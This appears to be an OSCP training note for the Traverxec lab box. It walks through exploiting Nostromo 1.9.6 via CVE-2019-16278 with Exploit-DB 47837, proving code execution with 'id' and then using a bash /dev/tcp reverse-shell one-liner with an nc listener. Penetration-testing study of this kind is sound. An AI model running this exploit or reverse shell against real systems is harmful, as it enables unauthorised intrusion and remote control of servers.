# Linux - Nostromo RCE

**Step 10B of 50 · Linux Web Exploitation**

*Confirm Nostromo 1.9.6, review Exploit-DB 47837, and turn CVE-2019-16278 into a controlled command-execution proof.*

## When to use this

Use this page when a service scan identifies Nostromo 1.9.6. CVE-2019-16278 abuses a path-normalisation weakness in the HTTP request to reach `/bin/sh` and execute a supplied command. The public proof of concept must be reviewed and tested with a harmless command before a callback is attempted.

## Run this

```bash
searchsploit nostromo 1.9.6
searchsploit -x 47837
searchsploit -m 47837
mkdir -p $BoxDir/exploits
cp 47837.py $BoxDir/exploits/nostromo-47837.py
sed -i 's/^cve2019_16278\.py$/# cve2019_16278.py/' $BoxDir/exploits/nostromo-47837.py
python2 -m py_compile $BoxDir/exploits/nostromo-47837.py
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"
```

The identity output is the success condition. Expect a web-service account such as `www-data`, not root.

## Callback shell

Start the listener before asking the exploit to run a callback:

```bash
nc -lvnp $Lport
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
```

Then stabilize the shell using [[Linux - Shell Stabilise]].

## Example output

```text
$ python2 nostromo-47837.py $BoxIP $WebPort "id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Focus on the harmless identity result before the callback. It proves the target version, request path, command delivery, and execution account all align. Move next to [[Linux - RCE to Shell]] for the listener, then [[Linux - Shell Stabilise]] and [[Linux - Local Enum]].

## What did you get?

- [ ] `id` returns a service account → **Read the service configuration and route to [[Linux - Local Enum]]**
- [ ] The exploit raises a Python error → **Inspect the first lines, repair local syntax, compile, and retry the harmless probe**
- [ ] RCE works but no callback arrives → **Check `$LocalIP`, the listener, egress, and payload syntax before changing the exploit request**
- [ ] The target refuses connections → **Wait for Nostromo, lower web-enumeration concurrency, and use manual requests**
- [ ] The version is not 1.9.6 → **Do not assume the PoC applies; return to [[Linux - Exploit Search]]**

## Gotchas

> [!warning] 💡
> A public exploit may contain a stray filename line, a hard-coded port, or Python 2 syntax. These are local execution problems and should be fixed only after comparing the target version and the PoC prerequisites.

> [!warning] 💡
> A successful RCE response and a missing reverse shell are different failure domains. Prove execution with `id` first.

> [!warning] 💡
> Nostromo can be fragile under high request concurrency. A temporary connection refusal after a large Gobuster run is not evidence that the version changed.

## Efficiency

Once Nmap has identified Nostromo 1.9.6, this is the shortest validated branch:

```bash
searchsploit nostromo 1.9.6
searchsploit -x 47837
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"
```

Directory enumeration remains useful for finding public content, but it is not necessary to prove the known Nostromo RCE.

## Alternative tools

Metasploit can validate the same vulnerability, but the standalone Exploit-DB proof is preferable for OSCP practice because the request path and command delivery remain visible. If you use a framework, capture the module options and confirm the same `id` result.

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
- [[Linux - RCE to Shell]]
- [[Linux - Shell Stabilise]]

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- Nostromo 1.9.6 RCE via CVE-2019-16278 and Exploit-DB 47837

## External Resources

- [NVD: CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)
- [Exploit-DB 47837](https://www.exploit-db.com/exploits/47837)

## Why this matters for OSCP

This page turns a version banner into a controlled RCE test while keeping exploit review, callback troubleshooting, and fragile-service handling explicit.
